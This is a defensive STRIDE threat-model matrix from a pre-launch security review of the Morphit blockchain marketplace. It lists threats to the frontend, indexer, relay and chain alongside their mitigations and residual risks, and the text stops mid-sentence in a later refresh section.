# Morphit STRIDE matrix — pre-launch security review

> **2026-05-07 forward note:** the "3-minute" replace-window
> values referenced in this matrix describe the system at the
> time of the review. Updated to **15 minutes** in Part 70;
> see ADR-0001 Amendment for the threat-model re-analysis.

Threat-modeling matrix for the four primary attack surfaces:
1. Frontend (SvelteKit static SPA, served from operator's nginx)
2. Indexer (Hono HTTP server, public-read-only, reads chain → DB)
3. Relay (Hono HTTP server, signs account_create + drains transfer queue)
4. Chain (Blurt blockchain — public, federated)

Each row is a threat category × surface, recording: the threat, the existing
mitigation, residual risk, and any open gaps. Generated 2026-05 in the final
pre-launch audit pass.

────────────────────────────────────────────────────────────────────────

## Spoofing

### S1 — Attacker impersonates @morphit to push hostile release
**Surface:** Frontend / Indexer
**Threat:** Attacker compromises a key controlling an account named `morphit`
on a wormhole'd Blurt fork, broadcasts `morphit_release_v1` with a malicious
hash_manifest pointing at attacker-controlled JS bundles.
**Mitigation:**
- Indexer's `release.ts` handler enforces 3-condition AND: signer ===
  officialAccountName, signer's posting pubkey on chain === pinned
  officialPostingPubkey, payload validates structurally
- Frontend pins the same officialPostingPubkey via the build
- Chain ID pinned, indexer refuses to operate against a different chain
**Residual risk:** if Posting key is compromised, the
canonical instance broadcasts a hostile release. Mitigation: posting
key is cold-signed for releases (canonical-operator procedure documented
in OPERATIONS.md §8 owner-key-rotation).
**Gap:** None observed.

### S2 — Attacker spoofs a legitimate user via on-chain custom_json forgery
**Surface:** Indexer
**Threat:** Attacker broadcasts `morphit_*` ops claiming to be from a victim.
**Mitigation:** Blurt's chain enforces signing — every custom_json carries
the broadcasting account's signature. Indexer takes `ctx.signer` from the
chain's verified signer field, never from the payload. Spoofing would
require compromising the victim's posting key, which is a chain-level
problem, not Morphit's.
**Residual risk:** Posting-key compromise is the user's responsibility.
**Gap:** None observable.

### S3 — Attacker uses display_name to impersonate operator accounts
**Surface:** Frontend rendering
**Threat:** User sets display_name = "@morphit" or homograph confusables
(Cyrillic м, fullwidth ＠, etc.), tries to look like a trust signal.
**Mitigation:**
- profile.ts handler rejects leading @ (or fullwidth ＠) with
  display_name_leading_at
- impersonatesReservedName confusable-skeleton check (Cyrillic/Greek/
  fullwidth substitutions for Latin)
- Forbidden char filter (control, bidi-override, ZWJ)
- NFC normalization before all checks
**Residual risk:** New homograph attacks against new reserved names will
require updating confusables.ts. Mitigated by the table-update process.
**Gap:** None observed.

### S4 — Off-host proxy lies about client IP
**Surface:** Relay rate limiter
**Threat:** Attacker on the loopback path forges X-Forwarded-For to bypass
per-IP rate limits and signup ceilings.
**Mitigation:**
- `clientIp()` only honors forwarded headers when peer is in
  LOOPBACK_PEERS = {127.0.0.1, ::1, ::ffff:127.0.0.1}
- Length cap on header values (64 chars)
- Leftmost XFF entry only
- C2 audit fix: leading-comma XFF (`, 1.1.1.1`) now correctly rejected
  rather than treated as a malformed leftmost entry that bypasses bucketing
**Residual risk:** If operator runs the relay directly on a public port
(not behind nginx loopback), socket peer IS the attacker's IP, so
forwarded-header forgery doesn't help. OPERATIONS.md §14 documents this
deployment requirement.
**Gap:** None observed (post-C2 fix).

────────────────────────────────────────────────────────────────────────

## Tampering

### T1 — Tampering with stored chain data after indexing
**Surface:** Indexer DB
**Threat:** Attacker with DB access modifies orders / feedback / profiles
to alter market signals or insert fake content.
**Mitigation:** Database access is operator-controlled — running the
indexer means trusting the operator. There's no in-band defense against
a malicious operator. Federation provides cross-instance comparison: a
user can switch to another operator's instance and re-derive state from
chain. The chain is the source of truth.
**Residual risk:** Yes — a single instance is only as honest as its
operator. Federation is the design response.
**Gap:** Not a gap; it's the threat model.

### T2 — Tampering with an order via replace within the 3-min window
**Surface:** Indexer order pipeline
**Threat:** User creates an order with substance X, swaps to substance Y
within the replace window to defeat policy.
**Mitigation:**
- Replace handler enforces side / asset / fiat_currency immutable
- B1 audit fix: waiver-floor (500 BLURT amount_min) re-enforced on
  replace when target.fee_method='waived_first_buy'
**Residual risk:** Other substantive fields (terms, location, payment_methods,
amount_max, price_model) ARE mutable in the 3-minute window — by design,
because that's the typo-fix purpose of the replace op.
**Gap:** None observed (post-B1 fix).

### T3 — Tampering with avatar SVG to inject XSS
**Surface:** Frontend rendering
**Threat:** Attacker submits profile op with `json_metadata.avatar_svg`
containing `<script>` or event handlers; victim viewing the profile gets
JS execution.
**Mitigation:**
- Frontend's avatar editor passes input through `sanitizeSvg` before
  broadcasting (script tags, event handlers, javascript: URLs all stripped)
- profileProps.ts re-sanitizes on read (G2.2 fix) — defense in depth
  against malicious indexer or chain-direct submission
- avatar_data_uri shape-validated to image/{webp,png,jpeg,gif} only
  (no SVG smuggling) (O3.2 fix)
**Residual risk:** A regression in sanitizeSvg's allowlist would expose
XSS. Mitigation: comprehensive test suite at `apps/web/src/lib/avatar/`.
**Gap:** None observed.

### T4 — Tampering with ciphertext-bearing chat message
**Surface:** Chat encryption
**Threat:** Attacker modifies a chat message's ciphertext mid-broadcast.
**Mitigation:** Chain signature covers the entire op including the
ciphertext field. Modifying after-the-fact breaks the signature; chain
rejects. ChaCha20-Poly1305 authentication tag inside the ciphertext
detects any modification post-broadcast even if signature was somehow
bypassed.
**Residual risk:** None.
**Gap:** None observed.

────────────────────────────────────────────────────────────────────────

## Repudiation

### R1 — User claims they didn't post an order
**Surface:** Chain layer
**Threat:** User posts an order, gets attestation/feedback consequences,
later denies posting.
**Mitigation:** Chain provides non-repudiable signed history. Signer is
verified by network; once on chain, it's permanent. Indexer's event_log
keeps an audit trail of every op processed.
**Residual risk:** None at chain layer. Off-chain trade-completion claims
are soft-rep — the indexer doesn't try to be a payment escrow.
**Gap:** None observed.

### R2 — Operator denies handling an HTTP request
**Surface:** Relay/Indexer logging
**Threat:** Operator claims a request never came in (e.g. abuse complaint).
**Mitigation:** The relay's access_log middleware (Part 47) records every
request with IP-elided rate-limit decisions, response codes, and trace IDs.
Sufficient for operator-side dispute resolution without storing IPs.
**Residual risk:** Operator could rotate logs. Mitigated by the federated
nature — abuse reports can include the on-chain trx_id which any honest
indexer can confirm.
**Gap:** None observed.

────────────────────────────────────────────────────────────────────────

## Information disclosure

### I1 — Indexer responses leak internal state via verbose errors
**Surface:** Indexer HTTP API
**Threat:** Stack traces, SQL errors, file paths in responses give attacker
recon data.
**Mitigation:** Every API endpoint wraps errors in stable code/message
shapes. Raw error messages never echoed to client (verified across all 4
relay endpoints, all 17 indexer handlers, all REST routes).
**Residual risk:** Low — log lines might leak under operator misconfiguration
(systemd stdout exposed). Mitigated by ops/systemd unit hardening (no
stdout-to-syslog by default).
**Gap:** None observed.

### I2 — Profile json_metadata reveals more than intended
**Surface:** Indexer /v1/profile
**Threat:** User sets json_metadata to include something they later regret;
chain history preserves it forever.
**Mitigation:** Documented in FAQ — chain is permanent, anything broadcast
becomes public forever. Frontend doesn't pre-populate metadata fields the
user didn't explicitly set.
**Residual risk:** Inherent in any chain-published profile. Not Morphit's
threat to mitigate.
**Gap:** None observed.

### I3 — Rate-limiter buckets leak who-is-active patterns
**Surface:** Relay
**Threat:** A side-channel observer measuring 429 response timing could
infer activity patterns by IP class.
**Mitigation:** Rate limiter buckets are in-memory only, never persisted,
never queryable from outside. Bucket keys are HMAC'd IPs (in invite tokens)
and bare IPs in the rate-limiter map (transient, GC'd).
**Residual risk:** Network observers can already see request volume; the
rate limiter doesn't add a new leak.
**Gap:** None observed.

### I4 — Chat metadata leaks even though ciphertext is encrypted
**Surface:** Chain / Indexer
**Threat:** Chat sender + recipient + timing are visible to any chain
observer. Pattern analysis can reveal social graph.
**Mitigation:** Documented in `docs/METADATA-LEAK-CATALOG.md`. The chat
encryption protects content; metadata is structurally public on Blurt.
Users who need metadata privacy should use Tor / out-of-band channels.
**Residual risk:** Inherent; documented; user-visible warning in chat
onboarding.
**Gap:** None observed.

### I5 — Operator-balance probe data could leak relay liquidity
**Surface:** Relay /v1/health
**Threat:** External observer polls health endpoint, learns when the
relay is low on funds, times an attack to coincide.
**Mitigation:** Verbose health gated by `verboseHealth` config knob —
operator can disable. Default ON for canonical instance because operators
need monitoring; community operators in adversarial contexts can flip
it off.
**Residual risk:** Verbose-on operators leak liquidity signal. Documented
trade-off.
**Gap:** None observed.

────────────────────────────────────────────────────────────────────────

## Denial of service

### D1 — Indexer storage exhaustion via huge custom_json payloads
**Surface:** Indexer DB
**Threat:** Attacker broadcasts max-size `custom_json` ops repeatedly to
fill DB.
**Mitigation:**
- Every JSONB-receiving handler has size cap via `checkJsonbSize` (4 KB
  general, 8 KB profile)
- Chain-level custom_json size cap (~8 KB) provides an upstream bound
- Per-account chain RC budget caps how many ops one attacker can post
**Residual risk:** Botnet of accounts could collectively spam, but each
account costs 100 BLURT (chain account_creation_fee) — economic floor.
**Gap:** None observed.

### D2 — Relay BLURT depletion via signup spam
**Surface:** Relay
**Threat:** Attacker exhausts the relay's BLURT balance by triggering
account_create requests up to the relay's funding limit.
**Mitigation (multi-layer "drain defense stack" per OPERATIONS.md §18):**
- Layer 1: Per-IP burst limiter (5/hour default)
- Layer 2: Per-IP daily limiter (2/day default, with spacing)
- Layer 3: Global daily ceiling (50/day default, atomic via tryReserve)
- Layer 4: Invite-token gate (HMAC-signed, IP-bound, 10-min TTL,
  single-use)
- Layer 5: ALTCHA proof-of-work after Nth invite/day per IP
- Layer 6: Kill-switch (env + file sentinel) for incident response
- Layer 7: Anomaly probe — indexer-side scanner correlates LOW_BALANCE
  alert with peak-hour signup spike, recommends kill-switch toggle
**Residual risk:** A determined botnet with thousands of fresh IPs and
ALTCHA-solving capability could still hit the daily ceiling. After that,
the kill-switch and operator alert close the loop.
**Gap:** None observed.

### D3 — Indexer poller starvation via slow Blurt RPC
**Surface:** Indexer chain reader
**Threat:** All configured Blurt RPC endpoints become slow/unavailable.
**Mitigation:** Multi-endpoint rotation in indexer config; staleLag-
threshold detection flips /v1/health to stale=true; circuit breakers
on BTC/XMR explorers (separate but same pattern).
**Residual risk:** All endpoints down simultaneously means no chain progress.
Recovery is automatic when any endpoint comes back.
**Gap:** None observed.

### D4 — Memory amplification via dailyInviteCounts map
**Surface:** Relay
**Threat:** Botnet floods invite endpoint with millions of distinct IPs;
the per-IP-per-day map grows unbounded.
**Mitigation:** MAX_DAILY_TRACKED_IPS=100k cap with FIFO eviction
(audit finding 16-B1 already shipped). Worst case: ~5 MB memory.
**Residual risk:** None observed.
**Gap:** None observed.

### D5 — Frontend rendering DoS via crafted price_model
**Surface:** Frontend orderbook UI
**Threat:** Attacker posts an order with deeply-nested price_model that
crashes the renderer.
**Mitigation:**
- Indexer enforces 4 KB JSONB cap on price_model
- Order handler shape-validates known kinds (`spread`, `fixed`); unknown
  kinds pass through but the frontend's priceModelDisplay falls back to
  "Custom price" string rather than recursively rendering
**Residual risk:** A truly novel kind with deeply-nested unknown shape
could still confuse renderers. Mitigation: priceModelDisplay treats
non-recognized shapes as opaque, never recurses.
**Gap:** None observed.

────────────────────────────────────────────────────────────────────────

## Elevation of privilege

### E1 — User claims operator privileges via display_name
**Surface:** Frontend rendering
**Threat:** A user sets display_name="Morphit Operator" or similar to
look authoritative.
**Mitigation:** display_name is just a free-text string with the hardening
described in S3. The frontend never grants privileges based on it. The
Verified Chat Badge (real verification) is computed deterministically from
chain history, not from user-claimed strings.
**Residual risk:** None observed.
**Gap:** None observed.

### E2 — Sock-puppet attestor self-promotes order to verified
**Surface:** Indexer fee verification fallback
**Threat:** Order author creates two sock accounts, has them attest each
other's orders to flip fee_status='pending_external' →
'verified_by_attestation', bypassing fee payment.
**Mitigation (ADR-0011 §3 + Finding I):**
- ≥2 distinct attestors required
- ≥1 must be NOT-the-poster
- Each attestor must pass eligibility gate (loyalty + age, phase-aware)
- All checked in the handler before quorum logic
**Residual risk:** A long-running attacker could grow accounts to meet the
eligibility thresholds, but the cost (account creation fee × 2 + months
of activity) exceeds the benefit (waiving a single 60-BLURT listing fee).
**Gap:** None observed.

### E3 — User flips operator-block list on someone else's instance
**Surface:** Indexer operator-block handler
**Threat:** Attacker broadcasts `morphit_operator_block_v1` claiming to be
an operator, blocks legitimate users.
**Mitigation:** Handler rejects unless ctx.signer === operatorAccountName
(B3 fix — was officialAccountName, now per-instance).
**Residual risk:** None — each instance accepts only its own operator's
ops.
**Gap:** None observed (post-B3 fix).

### E4 — Tag squatting via operatorRegister
**Surface:** Indexer operatorRegister handler
**Threat:** Attacker pre-registers `morphit`, `agorise`, etc. tags before
legitimate operators.
**Mitigation:**
- isReservedTag check (P6-3 fix)
- Tag-pattern restricts to `[a-z0-9._-]+` (no homographs)
- Tag is immutable post-registration (one-shot per account)
**Residual risk:** New reserved names not yet in the table. Mitigation:
the table is updatable; ADR amendment process documented.
**Gap:** None observed.

────────────────────────────────────────────────────────────────────────

## Summary

24 STRIDE rows examined across the four primary surfaces. **All have
mitigations in place; no open gaps observed.** Three findings discovered
during this audit pass (B1 waiver-replace bypass, B3 operator-account
gate conflation, C2 IP-extraction parseXff edge case) were closed as
part of this same session.

The most security-critical surfaces (relay account creation, indexer
fee verification, profile json_metadata rendering) all have layered
defenses with explicit test coverage on the trust boundaries.

────────────────────────────────────────────────────────────────────────

## Part 88 refresh — post-Part-29 attack surfaces (2026-05-08)

The matrix above (S1–E4) was generated Part 29 against four primary
surfaces.  Substantial new attack surface has shipped since.  This
section appends STRIDE rows for surfaces introduced or substantively
expanded between Part 30 and Part 87.

**Scope of this refresh:**
1. Desktop QR-pairing (ADR-0022, Part 30, brag-list entry on IPv6 prefix bucketing was dropped during a slim pass; defense lives in apps/relay/src/middleware/ip.ts)
2. Operator-payout automation (Part-47 era)
3. Kill-switch middleware (Part 47)
4. Layer 7-8 squatter defenses — Altcha PoW + RESERVED_NAMES +
   DICTIONARY_BRANDS + global daily ceiling persistence
5. Asset-registry runtime-immutable canonical list (brag-list entry on CSP-header inheritance was dropped during a slim pass; defense lives in nginx config + apps/web hooks.ts CSP middleware)
6. Witness fee delta-alert pipeline (brag #221)
7. IPv6 prefix bucketing at relay (brag-list entry on IPv6 prefix bucketing was dropped during a slim pass; defense lives in apps/relay/src/middleware/ip.ts)
8. CSP-header inheritance fix at nginx (brag-list entry on CSP-header inheritance was dropped during a slim pass; defense lives in nginx config + apps/web hooks.ts CSP middleware)
9. Build manifest + on-chain `morphit_release_v1` reproducibility
   (brag #222)
10. CI gate posture post-Part-87 (lint pipeline + workspaces test job)

────────────────────────────────────────────────────────────────────────

## Spoofing — refresh

### S5 — Phone-side QR-pairing signature replayed against chain ops
**Surface:** Frontend / Indexer / Phone signer
**Threat:** Attacker captures the user's signed pairing bundle in
transit (e.g., compromised operator relay, MITM on phone-to-operator
hop) and tries to replay the signature against an unrelated chain
operation — recovering the account's posting authority via a
phishing-flow that induced the user to sign a pairing request.
**Mitigation:**
- **Domain separation in the signing digest:**
  `SHA-256("morphit-pairing-v1\n" || canonical_bundle_bytes)` per
  ADR-0022.  The literal prefix `"morphit-pairing-v1\n"` is NOT a
  valid prefix for any chain transaction signing input (which uses
  Blurt's `chain_id || serialized_tx`).  A captured pairing
  signature decodes against the pairing digest and would fail
  verification against any chain-tx digest.  Verified at
  `apps/web/src/lib/auth/pairingClient.ts` and
  `apps/indexer/src/api/loginPairing.ts`.
- **Fresh nonce per pairing attempt:** desktop generates a fresh
  random nonce per request; phone refuses to sign a bundle whose
  nonce it has signed before (replay window).
- **Echo-check round trip:** desktop verifies the returned bundle
  matches the request's nonce + URL + display name before accepting.
**Residual risk:** Phone signs a pairing bundle for the wrong
website (`morph1t.io` phishing).  Mitigated by phone showing the
URL with explicit `dir="ltr"` (RTL-override homoglyph defense from
ADR-0022) and a "is this the site you intended?" confirmation card;
not eliminated — user may tap through.  Recommended UX: future
phone app could pin known-good origins.  Filed in REVISIT-LIST.
**Open gaps:** none structural.

### S6 — Operator-payout sender impersonates @morphit-fees in payout broadcast
**Surface:** Relay / Chain
**Threat:** Attacker compromises an operator's relay (or its host),
broadcasts a transfer FROM `@morphit-fees` (the treasury account)
TO an attacker address using the relay's posting key — claiming
"payout to operator" while actually draining the treasury.
**Mitigation:**
- **Relay holds the OPERATOR's active key, NOT @morphit-fees's
  active key.**  The treasury account's keys live with the
  project team, not with any operator's relay.  Verified at
  `apps/relay/src/queue/drainer.ts` lines 283–297: every queue
  row broadcasts with `from: this.config.relayAccount` +
  `fromActiveWif: this.config.relayActiveKeyWif` — both scoped
  to the operator's own account.
- **Operator-payout flow is queue-based**
  (`apps/indexer/src/indexer/operatorEarnings.ts`): when the
  indexer sees a BLURT listing-fee inflow, it computes the
  operator's 90/10 share, INSERTs a row into
  `relay_pending_transfers` with `reason = 'operator_payout:<trx_id>'`,
  and the relay drainer picks it up.  The relay's authority is
  scoped to broadcasting from the operator's own configured
  account — it has no key material that could spoof
  @morphit-fees.
- **Each operator's account is independently keyed** —
  compromise of one operator does not propagate to others or to
  the treasury.
**Residual risk:** Compromised operator can drain THEIR OWN
account.  This is the explicit operator-trust boundary — operators
take custody of their own balance, project takes custody of
@morphit-fees.  Documented in `docs/OPERATOR-TRUST-DESIGN.md`.
**Open gaps:** none.

### S7 — Witness-fee alert spoofed by malicious chain RPC
**Surface:** Indexer / Chain RPC
**Threat:** Attacker controls the operator's RPC endpoint (or
intercepts unencrypted RPC traffic — though chain RPC is
TLS-protected) and feeds the witness-fee poller a fake
`account_creation_fee` value, triggering a `FEE_CHANGED` alert
with attacker-chosen old/new values.  Operator panic-reacts by
broadcasting a corrective chain op or notifying users incorrectly.
**Mitigation:**
- **callMany chain rotator** — the indexer's RPC layer
  (`apps/indexer/src/rpc/rotator.ts`) requires quorum across N
  endpoints before accepting a chain-fact answer (S2 / 2-7 / 2-8
  audit fixes).  A single malicious endpoint cannot poison the
  fee-poller's reading.
- **Alert is INFORMATIONAL** — operator is told a fee changed,
  not directed to take any specific action.  Operators with
  Discord/Matrix bot integrations get rich delta context to make
  their own judgment.  No automatic chain broadcast triggered.
**Residual risk:** If quorum-many endpoints simultaneously lie
(e.g., Sybil attack against the RPC pool), the alert reflects a
false fee.  Chain RPC pools used in practice are operated by
distinct organizations; a coordinated lie across all of them is
very high-cost.
**Open gaps:** none structural.  The operator-judgment-required
disposition is intentional.

────────────────────────────────────────────────────────────────────────

## Tampering — refresh

### T5 — Tampering with asset-registry at runtime
**Surface:** Indexer / Frontend (in-memory)
**Threat:** Code somewhere in the binary mutates `ASSETS` or
`ASSET_TICKERS_SET` (e.g., via `(asset_registry as any).ASSETS.push(...)`)
to inject a fake ticker or override BTC's address regex with a
permissive one — bypassing the canonical-list invariant that
every asset trade is constrained to known-valid types.
**Mitigation:**
- **`Object.freeze` deep on `ASSETS`** — every entry's prototype
  is frozen, so `.push()`, `.length=`, property reassignment all
  throw in strict mode.
- **`Proxy` trap on `ASSET_TICKERS_SET`** — `add`/`delete`/`clear`
  trap and throw with a clear error referencing the package.
- **`packages/asset-registry/scripts/asset-registry-smoke.ts`**
  runtime-asserts the invariants in CI: exactly one coordination
  chain (Blurt), no duplicate tickers, every entry has all
  required fields, address-shape regex accepts known-valid
  addresses and rejects obvious typos, runtime mutation throws.
- **Canonical-list import enforced at every consumer site** —
  any new asset reference goes through the registry, no string
  literals scattered.
**Residual risk:** A compiled-out non-strict-mode shim could
silently swallow the freeze throw.  Mitigated by the build
pipeline always emitting strict-mode JS (vite default + `"use
strict"` at top of every TS file post-bundle).  Not zero — a
compromised build host could in principle disable strict mode.
That's the wider build-tampering threat covered by S1 / brag
#215 reproducibility.
**Open gaps:** none.

### T6 — Tampering with kill-switch state file
**Surface:** Relay
**Threat:** Attacker with file-system write access to the relay's
host flips the kill-switch state file from "off" to "on", bricking
the relay (so legitimate users see a lockout) — OR flips it from
"on" to "off" during a planned downtime, restoring service the
operator had intentionally killed.
**Mitigation:**
- **File-system access IS root-equivalent** for the relay's
  process — once an attacker can write the kill-switch file, they
  can also exfiltrate the relay's posting key envelope, restart
  the process with poisoned config, etc.  The kill-switch is not
  the weakest link in the host-compromise scenario; it is one of
  several capabilities the attacker would have anyway.
- **Audit trail in structured logs** — every kill-switch flip
  emits a `kill_switch_activated` or `kill_switch_deactivated`
  log line with timestamp.  An operator routinely reading their
  access-log can detect tampering after the fact.
**Residual risk:** No cryptographic protection on the kill-switch
state itself.  Acceptable because the threat model explicitly
trusts the operator's host (the project posture is "operators
take custody of their own infrastructure").  Filed: future
hardening could sign the state file with the operator's posting
key, but this trades complexity for value-at-risk that's already
covered by host-level access control.
**Open gaps:** none in current threat model.

### T7 — Tampering with on-chain `morphit_release_v1` to point at hostile bundles
**Surface:** Frontend integrity / Chain
**Threat:** Existing S1 row covered the spoofing dimension
(attacker-published release op).  This row covers the tampering
dimension: an attacker who legitimately controls the @morphit
posting key (e.g., a future maintainer who turns hostile) could
broadcast a malicious release op pointing to attacker-controlled
JS bundle hashes — and users' frontends would fetch and execute
those bundles after the next release-poll cycle.
**Mitigation:**
- **TOFU posting-key pin (S2 fix)** — the indexer's
  `release.ts` handler validates the signer's posting pubkey
  against a chain-anchored quorum before pinning.  A forked-chain
  injection cannot succeed.  However, this does not protect
  against the legitimate @morphit posting key being misused.
- **Build-from-source path is documented** — README §Build from
  source explicitly directs paranoid operators / users to clone
  the repo, build locally, and pin their own.  The whole point of
  AGPL-3.0 + `npm run build:manifest` reproducibility (brag #222)
  is that any user can verify "the bytes I'm running match the
  bytes I see in the repo at this commit."
- **Multi-eyes review of any release** — pre-launch, releases
  go through PR review on Forgejo before the @morphit posting key
  signs them.  This is process-not-code.
**Residual risk:** If the @morphit posting key is compromised,
the protocol cannot prevent a hostile release op.  Recovery path:
the project broadcasts a corrective release op from a recovered
account; users' frontends update on the next poll.  Net window of
exposure: typical release-poll interval (15 minutes — the
"why-15-minutes" justification carries through).
**Open gaps:** Threshold-multisig for the @morphit posting key
would eliminate the single-key-compromise scenario.  Filed in
REVISIT-LIST as long-term hardening.

────────────────────────────────────────────────────────────────────────

## Repudiation — refresh

### R3 — Operator denies they enabled the kill switch during user lockout
**Surface:** Relay
**Threat:** Operator flips kill-switch ON during a user's chain
broadcast, the broadcast fails, user complains.  Operator denies
ever flipping the switch.
**Mitigation:**
- **Structured `kill_switch_activated` / `kill_switch_deactivated`
  logs** with timestamp.
- **Operator-trust posture explicitly says "operators run their
  own instance"** — users dissatisfied with one operator's
  handling can move to a different operator (federation premise).
  No global trust requirement.
- **`docs/OPERATOR-TRUST-DESIGN.md`** documents the contract:
  operators are not custodians, they are facilitators; their
  failure modes are captured by federation choice, not by appeal.
**Residual risk:** A user who only ever uses one operator's
instance has no out-of-band record.  This is by design — the
project does not collect or attest user activity.
**Open gaps:** none in threat model.

### R4 — User repudiates a phone-signed pairing
**Surface:** Phone signer
**Threat:** User signs a pairing bundle, later denies it
("someone else used my phone").
**Mitigation:**
- **Pairing signs with the user's posting key** — same key that
  signs every chain op, so denial of one signature is denial of
  all signatures from that account.
- **Confirmation card displayed before signing** — explicit
  user gesture required.
- **Single-use / nonce-bound** — pairing signature cannot be
  retroactively claimed for a different desktop session.
**Residual risk:** Standard "stolen device" scenario applies —
mitigated by phone OS lock + Morphit's per-app password gate
(active-key wipe on lock per K1.2).
**Open gaps:** none.

### R5 — Operator repudiates a canary going stale
**Surface:** Frontend (operator transparency mechanism)
**Threat:** Operator's `/canary.txt` becomes stale (operator
fails to regenerate within the documented 14-day silence
window).  Operator later claims they DID regenerate and the
staleness was a publishing-pipeline bug.
**Mitigation:**
- **Canary template structure forces explicit declaration** —
  `apps/web/static/canary.txt.template` enumerates each
  warrant-canary clause (NSL, FISA, gag order, backdoor demand,
  IP-logging demand) so the operator can't claim "I forgot what
  the canary covered."
- **Generator + template drift caught by canary-template-smoke** —
  template changes that don't match the generator's substitution
  set fail CI.  A "I changed the template but forgot to update
  the generator" defense is closed.
- **Documented 14-day silence-implies-tripped window** — the
  template itself tells the reader "if more than 14 days old,
  treat as silent."  The operator can't redefine the silence
  semantics after the fact.
- **`scripts/canary/verify.ts`** for clients/auditors to
  programmatically check freshness + structural integrity.
**Residual risk:** Operator publishes a stale canary AND lies
about regenerating.  External auditors comparing the
`Generated` timestamp on canary fetches across time can detect
this; users can't from a single fetch.
**Open gaps:** none in current design.  Future: canary could be
signed by the operator's posting key with the timestamp included
in the signed payload, so a forged "I regenerated yesterday"
claim is provably false.  Filed as REVISIT-LIST hardening.

────────────────────────────────────────────────────────────────────────

## Information disclosure — refresh

### I6 — QR-pairing leaks pairing bundle to operator's relay
**Surface:** Indexer (operator's loginPairing endpoint)
**Threat:** The pairing bundle transits the operator's `loginPairing`
endpoint as ciphertext — but the operator could log enough metadata
(timestamps, source IPs, account names) to correlate "user X
authenticated to desktop Y at time T" even without decrypting.
**Mitigation:**
- **Bundle payload encrypted with desktop's ephemeral pubkey** —
  operator sees only ciphertext + routing metadata (account,
  nonce, timestamp).
- **Operator can log timestamps/IPs anyway** — this is the
  baseline operator-trust posture.  Pairing doesn't worsen it.
- **Privacy-preserving operator defaults** — the project's
  recommended operator config does NOT log IPs by default
  (per the brag-list privacy principles).  Compliant operators
  can independently audit their own log retention.
**Residual risk:** Hostile operator chooses to log everything.
The user's mitigation is operator choice (federation).
**Open gaps:** none — operator-trust boundary is explicit.

### I7 — Witness-fee alerts shape leaks operator's polling cadence to RPC providers
**Surface:** Indexer
**Threat:** Operator's chain-RPC provider can profile the
operator's instance based on `account_creation_fee` query
patterns — frequency, timing, source IP.
**Mitigation:**
- **Polling is hourly, low-volume** — does not stand out
  against any operator running an indexer + relay (which polls
  the chain dozens of times per minute for blocks).
- **The query itself is unauthenticated** — anyone running a
  Blurt indexer queries this; no special signature.
- **callMany rotator distributes queries across multiple RPC
  endpoints** — no single endpoint sees the full pattern.
**Residual risk:** Aggregate side-channel from cooperating RPC
providers.  Mitigated by the operator running their own RPC
node (documented as recommended for high-volume operators).
**Open gaps:** none structural.

### I8 — IPv6 prefix bucketing reveals which IPv6 buckets are "active" via rate-limit responses
**Surface:** Relay
**Threat:** An attacker sending requests from many /64 buckets
within a /48 can probe rate-limit responses to learn which
neighbors are recently active (since shared rate-limit slots
hint at concurrent activity).
**Mitigation:**
- **Rate-limit responses are uniform** (`429` with no
  per-bucket detail) — attacker learns "this bucket has been
  rate-limited" but not who else is in it.
- **/64 buckets are ALREADY a huge amount of address space** —
  even profiling at the /64 granularity gives the attacker no
  individual-user resolution.
- **Buckets expire** (per the rate-limiter's TTL window) — an
  attacker would have to keep probing to maintain the picture.
**Residual risk:** Aggregate "this whole /48 has been busy"
inference.  Acceptable under the threat model — IP-level
metadata is not what Morphit promises to protect.  Tor / I2P /
Lokinet operator paths are the privacy-preserving alternative.
**Open gaps:** none.

────────────────────────────────────────────────────────────────────────

## Denial of service — refresh

### D6 — Squatter farms exhaust the global daily ceiling
**Surface:** Relay (signup)
**Threat:** A squatter operates many residential IPs, each making
account-creation requests in tight succession.  The global daily
ceiling fires and blocks LEGITIMATE users from creating accounts
for the rest of the day, creating a denial-of-service against
real users.
**Mitigation (layered):**
- **Altcha PoW** from the second invite onward (`squatter-defense`
  layer 8) — increases the per-account compute cost for an
  attacker, raising the cost of farming.
- **`RESERVED_NAMES` + `DICTIONARY_BRANDS` deny-list** — bulk
  brand grabs hit the deny-list before consuming a ceiling slot.
- **IPv6 /64 + IPv4 /24 prefix bucketing** at the rate limiter —
  a /48 attacker can't trivially evade with sub-prefix rotation.
- **Global daily ceiling persists across relay restarts**
  (audit fix 5-4) — restart-evade attack closed.
- **Sequential-name detector** flags numeric-suffix farms and
  raises Altcha difficulty per match.
- **OPERATIONS §38 diamond-hardened preset** documents the
  squatter-resistance trade-off operators can opt into (5-char
  minimum names, Altcha from second invite, 90-minute spacing,
  ceiling 20, 24-hour window).
**Residual risk:** A determined attacker with sufficient compute
+ unique IPs CAN exhaust the ceiling.  This is the "absorb-and-
contain" posture: the ceiling LIMITS damage, doesn't ELIMINATE
it.  When the ceiling is exhausted, legitimate users see a
clear message and can try again the next day, or pick a
different operator (federation premise).
**Open gaps:** none — this is a fundamental cost-of-attack
trade-off, not a defect.

### D7 — Build manifest computation as DoS
**Surface:** Frontend integrity (CI / operator host)
**Threat:** An attacker submits a PR that pads the build output
with millions of tiny files — `npm run build:manifest` recurses
the build directory and the manifest computation becomes
expensive (slow CI, host disk I/O).
**Mitigation:**
- **`apps/web/scripts/build-manifest.mjs`** is a single sorted
  walk; runtime is O(N log N) on file count.
- **Bundle size check** — `find build/_app -type f -name '*.js'
  -exec cat {} + | wc -c` warns if total JS exceeds 500KB
  (Phase-1 budget ~100KB gzipped) — would be tripped before a
  malicious PR's bloat reached pathological scale.
- **Pre-launch: PR review is the gate** — any PR adding
  thousands of files is rejected at review.
**Residual risk:** A subtle PR adds many medium-size files
just below the bundle-size warning.  Caught by manual review.
**Open gaps:** none material.

────────────────────────────────────────────────────────────────────────

## Elevation of privilege — refresh

### E5 — Sock-puppet desktop pairs as a different account
**Surface:** Phone signer / Indexer
**Threat:** Desktop initiates a pairing as account A; attacker
intercepts the QR display, swaps in their own pairing nonce, and
gets the user's phone to sign account A's signature for the
attacker's desktop.  Attacker's desktop is now signed in as A.
**Mitigation:**
- **Bundle bound to desktop's ephemeral pubkey** — the
  encrypted permission slip is decryptable ONLY by the desktop
  whose pubkey was in the QR.  An attacker who swapped the QR
  has a different desktop pubkey; the phone's signed bundle
  decrypts to nothing useful for them.
- **URL/origin in the confirmation card** — phone displays the
  origin the desktop is at; if the user expects `morphit.io` and
  sees `attacker.example`, they can refuse.
- **One-time nonce + freshness window** — even if the attacker
  somehow captured the bundle, they can't replay it.
**Residual risk:** Attacker controls the user's network and
shows a phishing origin that the user mistakes for legitimate
(e.g., punycode homoglyphs).  RTL-override homoglyph attack is
explicitly mitigated by `dir="ltr"` rendering; other homoglyphs
